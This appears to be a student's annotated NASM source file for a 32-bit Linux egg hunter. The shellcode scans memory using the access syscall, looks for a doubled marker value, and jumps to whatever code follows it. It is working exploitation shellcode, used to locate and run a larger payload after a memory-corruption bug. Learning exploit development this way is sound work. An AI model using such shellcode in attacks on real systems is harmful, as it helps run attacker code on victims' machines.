; author ron chan
; compile
; nasm -f egghunter.nasm
; ld egghunter.o -o egghunter
; objdump -d egghunter

; going to leverage access systemcall
; int access(const char *pathname, int mode);


global _start			

section .text
_start:	
	mov ebx,0x50905090 ; this is the egg, 
	xor ecx,ecx ; ecx = 0
	mul ecx; eax,edx = 0
page:
	or dx,0xfff ; align the memory address, not sure why, need to understand this later
	; TODO: understand why dx need to align with 0xfff , 
	; ANSWER: because this is speeding up the process, that we can search it in more robust way
	; the process is 1000 -> 2000 -> 3000 -> until valid address found let say 10000 is valid accessible address -> 10001 -> 10002 -> 10003

search:
	inc edx ; this would cause 0xfff + 0x1 = 0x1000
	pusha;  pushes all of the current general puposes registers onto the stack, such that they can be preserved across the call
	lea ebx,[edx+0x4]
	mov al,0x21 ; set access call 0x21 = 33
	int 0x80
	cmp al,0xf2
	popa
	jz page;
	cmp [edx],ebx
	jnz search;
	cmp [edx+0x4],ebx
	jnz search;
	jmp edx;
